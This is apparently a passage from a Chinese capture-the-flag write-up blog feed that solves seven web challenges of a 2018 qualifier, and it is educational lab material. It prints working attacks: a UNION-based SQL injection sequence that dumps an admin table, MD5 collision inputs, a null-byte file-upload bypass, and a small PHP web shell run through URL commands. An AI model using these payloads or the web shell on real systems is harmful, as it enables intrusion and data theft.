class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line">        var flag &#x3D; document.getElementById(&quot;flag&quot;).value;</span><br><span class="line">        var str &#x3D; &quot;d84d9657e5e5e&quot; || 0;</span><br><span class="line">        var str &#x3D; str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);</span><br><span class="line">        var str &#x3D; str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;</span><br><span class="line">        var str &#x3D; str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br><span class="line">        if (str &#x3D;&#x3D; flag)&#123;</span><br><span class="line">            alert(&quot;恭喜你已经找到flag！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>然后就好说了，把<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str &#x3D; &quot;d84d9657e5e5e&quot; || 0;</span><br><span class="line">var str &#x3D; str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);</span><br><span class="line">var str &#x3D; str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;</span><br><span class="line">var str &#x3D; str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br></pre></td></tr></table></figure><br>这4行代码粘贴到浏览器的控制台中，然后让浏览器弹出str的值就可以了<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2.png" alt><br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/3.png" alt><br>献上flag:    <code>4df4aedd8b4949ad2a2e5e5e7569d48d</code></p><h3 id="2-简单的MD5"><a href="#2-简单的MD5" class="headerlink" title="2.简单的MD5"></a>2.简单的MD5</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8004/" target="_blank" rel="noopener">http://114.55.36.69:8004/</a><br>进去后直接查看页面源代码：<code>easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;fail</code><br>里面有这个东西</p></blockquote><p>分析之后发现，这个就是普通的PHP弱类型，用数组就行了<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/4.png" alt><br><code>flag{401cf19d304e557349fecda18110c138}</code></p><h3 id="3-MD5"><a href="#3-MD5" class="headerlink" title="3. MD5"></a>3. MD5</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8006/" target="_blank" rel="noopener">http://114.55.36.69:8006/</a><br>查看源代码有这句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&#39;data1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;data2&#39;]&amp;&amp;md5($_POST[&#39;data1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;data2&#39;]))</span><br></pre></td></tr></table></figure><br>这个用的是MD5碰撞<br>想学习的可以看这个博客：<a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/79088218</a><br>这里直接给出payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">data2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><br>提交时需要用urlencode一下<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/5.png" alt><br><code>flag{9bd1ee7355b58e53214adb9a37b4cb82}</code></p></blockquote><h3 id="4-新闻搜索"><a href="#4-新闻搜索" class="headerlink" title="4.新闻搜索"></a>4.新闻搜索</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8010/" target="_blank" rel="noopener">http://114.55.36.69:8010/</a><br>刚开始没思路，后来看到源代码里面有一段JavaScript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">var x&#x3D;document.getElementById(&quot;number&quot;).value;</span><br><span class="line">    var a&#x3D;document.getElementById(&quot;word&quot;).value;</span><br><span class="line">    var b&#x3D;a.replace(&#x2F;[\ |\~|\&#96;|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&#39;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]&#x2F;g,&quot;&quot;);</span><br><span class="line">    if(a.length!&#x3D;b.length)</span><br><span class="line">    &#123;</span><br><span class="line">      alert(&quot;请输入正确字符。&quot;);</span><br><span class="line">      document.getElementById(&quot;number&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">      document.getElementById(&quot;word&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(isNaN(x))</span><br><span class="line">    &#123;</span><br><span class="line">      alert(&quot;请输入数字。&quot;);</span><br><span class="line">      document.getElementById(&quot;number&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>许多字符被过滤掉了，猜测可能要用SQL注入，而它代码放到了前端，也就是说过滤只能从前端过滤，用hackbar注入它是检测不到的<br>直接给出payload:<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/6.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET:http:&#x2F;&#x2F;114.55.36.69:8010&#x2F;</span><br><span class="line">POST:</span><br><span class="line">word&#x3D;-1&#39; union select 1,database(),2%23&amp;number&#x3D;5</span><br><span class="line">word&#x3D;-1&#39; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;&#39;news&#39;%23&amp;number&#x3D;5</span><br><span class="line">word&#x3D;-1&#39; union select 1,group_concat(column_name),2 from information_schema.columns where table_name&#x3D;&#39;admin&#39;%23&amp;number&#x3D;5</span><br><span class="line">word&#x3D;-1&#39; union select 1,group_concat(flag),2 from admin%23&amp;number&#x3D;5</span><br></pre></td></tr></table></figure></p></blockquote><pre><code>flag{f98505d1d12f50a0bd9463e90876630}</code></pre><h3 id="5-Game"><a href="#5-Game" class="headerlink" title="5.Game"></a>5.Game</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8011/" target="_blank" rel="noopener">http://114.55.36.69:8011/</a><br>emmmm  贪吃蛇挺好玩的</p></blockquote><p>查看源代码<br>  <img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/7.png" alt><br>两个链接，随便点一点<br>在<code>game.js</code>中发现了点东西</p><p><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/8.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure><br>好长啊<br>放到aaencode里面去<br>给出解码网站：<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a><br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/9.png" alt><br>    Flag{660332922504a5f06dd871a7fe78ba9c}</p><h3 id="6-参数提交"><a href="#6-参数提交" class="headerlink" title="6.参数提交"></a>6.参数提交</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8012/" target="_blank" rel="noopener">http://114.55.36.69:8012/</a><br>这个就没啥好说的了<br>POST提交参数就行了<br>    flag=1111111111111111<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/10.png" alt><br>    flag{858a14671c27804b63e6e96b0acdfdd7}</p></blockquote><h3 id="7-刚写了个小站"><a href="#7-刚写了个小站" class="headerlink" title="7.刚写了个小站"></a>7.刚写了个小站</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8014/" target="_blank" rel="noopener">http://114.55.36.69:8014/</a><br>这个题稍微有点坑，花了点力气<br>上来先注册一个号<br>进去后是个网站，先扫描后台发现有<code>url/uploads/</code>这个目录<br>然后想到这个题有可能是文件上传，果然在网站的侧栏发现了<code>upload</code>按钮<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/11.png" alt><br>上传其实很简单，后缀改成<code>.php.jpg</code>(这个题只能提交jpg,不能提交png)<br>然后抓包在php后边加个空格，在十六进制里把空格的20改成00截断，这样就可以上传成功<br>上传成功后用菜刀连不上，应该是网站加了安全保护措施<br>所以只能在URL框里执行命令了<br>上传的木马里写入这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arg &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($arg) &#123;</span><br><span class="line">system(&quot;$arg&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>然后在URL里直接使用<code>http://114.55.36.69:8014/upload/8a30ec6807f71bc69d096d8e4d501ade/u.php?cmd=ls</code><br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/12.png" alt><br>可以看到我们的命令被成功执行了<br>ok，接下来就是寻找flag的位置和查看flag了，直接给出payload<br><code>http://114.55.36.69:8014/upload/8a30ec6807f71bc69d096d8e4d501ade/u.php?cmd=cd%20..;cd%20..;cat%20flag.php</code><br>回车后页面是空的，因为php代码是不会显示出来的<br>查看页面源代码就能看到内容了<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/13.png" alt><br>    flag{N4me_sPac4_Is_Int3r3st1ng}</p></blockquote><p>由于时间有限，只写出来了7个题，剩下3个300分的还没看。2333333</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-Input&quot;&gt;&lt;a href=&quot;#1-Input&quot; class=&quot;headerlink&quot; title=&quot;1. Input&quot;&gt;&lt;/a&gt;1. Input&lt;/h3&gt;&lt;blockquote&gt;
